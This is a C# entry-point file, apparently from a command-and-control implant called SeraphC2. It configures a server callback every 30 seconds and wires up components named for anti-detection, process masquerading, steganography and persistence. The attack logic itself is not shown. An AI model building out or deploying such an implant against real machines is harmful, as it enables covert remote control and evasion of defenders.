using SeraphC2.Implant.Core;
using SeraphC2.Implant.Communication;
using SeraphC2.Implant.Commands;
using SeraphC2.Implant.SystemInfo;
using SeraphC2.Implant.Core.Persistence;
using SeraphC2.Implant.Core.Evasion;
using SeraphC2.Implant.Core.Stealth;

namespace SeraphC2.Implant;

class Program
{
    private static readonly ImplantConfig _config = new()
    {
        ServerUrl = "http://localhost:3000",
        CallbackInterval = TimeSpan.FromSeconds(30),
        ImplantId = Guid.NewGuid().ToString(),
        MaxRetries = 3
    };

    private static readonly CancellationTokenSource _cancellationTokenSource = new();
    private static ImplantCore? _implantCore;

    static async Task Main(string[] args)
    {
        Console.WriteLine("SeraphC2 Implant Starting...");
        
        try
        {
            // Initialize core components
            var httpClient = new HttpClientWrapper();
            var systemInfoCollector = new SystemInfoCollector();
            var commandProcessor = new CommandProcessor();
            
            // Initialize stealth and persistence components
            var antiDetection = new AntiDetection();
            var processMasquerading = new ProcessMasquerading();
            var steganography = new Steganography();
            var persistenceManager = new PersistenceManager(antiDetection);
            
            _implantCore = new ImplantCore(_config, httpClient, systemInfoCollector, commandProcessor,
                persistenceManager, antiDetection, processMasquerading, steganography);
            
            // Handle Ctrl+C gracefully
            Console.CancelKeyPress += OnCancelKeyPress;
            
            // Start the implant
            await _implantCore.StartAsync(_cancellationTokenSource.Token);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Fatal error: {ex.Message}");
            Environment.Exit(1);
        }
    }

    private static void OnCancelKeyPress(object? sender, ConsoleCancelEventArgs e)
    {
        e.Cancel = true;
        Console.WriteLine("\nShutting down implant...");
        _cancellationTokenSource.Cancel();
        _implantCore?.StopAsync().Wait(5000);
        Environment.Exit(0);
    }
}